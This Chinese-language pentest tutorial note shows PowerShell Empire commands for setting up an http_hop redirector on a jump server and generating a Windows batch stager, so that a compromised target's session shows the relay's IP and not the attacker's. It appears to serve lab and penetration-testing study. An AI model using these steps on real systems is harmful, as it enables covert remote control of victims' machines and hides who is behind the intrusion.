## 使用PowerShell Empire（http_hop）在Pentest期间隐藏IP [^1]

```bash
# kali 192.168.1.107
# Ubuntu 192.168.1.111
uselistener http
execute
# 启动http_hop侦听器
uselistener http_hop
set RedirectListener http
set Host http://192.168.1.111
# 执行上面的监听器将创建三个文件，如上图所示。将这些文件传输到 Ubuntu的/ var / www / html位置
usestager windows/launcher_bat
set Listener http_hop
execute
# 一旦我们的bat文件在目标PC中执行，我们将进行会话。现在，如果您观察到我们获得的IP会话是 Ubuntu 而不是Windows，但我们可以访问 Windows PC，类似地，在Windows中，它会显示攻击机器是Ubuntu而不是kali。因此我们的http_hop是有效的
# 总之， http_hop 监听器的主要优点是它可以帮助攻击者被识别为在目标PC上，因为所述监听器隐藏了原始IP。
```

[原文](https://www.hackingarticles.in/hiding-ip-during-pentest-using-powershell-empire-http_hop/)

---

[^1]: 与Metasploit类似，Empire的跳跃侦听器使用hop.php文件。当您激活跳跃侦听器时，它将生成三个PHP文件，这些文件将重定向您现有的侦听器。将所述文件放在您的跳转服务器（ubuntu）中，然后根据通过介体（即我们的跃点监听器）获取会话来设置您的stager

